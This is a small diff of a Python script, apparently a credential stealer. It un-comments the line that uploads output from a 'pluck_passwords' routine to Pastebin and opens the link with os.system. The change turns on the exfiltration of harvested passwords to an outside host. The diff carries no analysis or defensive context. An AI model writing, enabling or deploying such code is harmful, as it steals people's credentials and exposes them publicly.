@@ -85,7 +85,7 @@ def main():
 
 	vulture = Bird()
 	vulture.pluck_passwords()
-	# os.system('start {}'.format(vulture.upload_to_pastebin()))
+	os.system('start {}'.format(vulture.upload_to_pastebin()))
 
 
 if __name__ == '__main__':
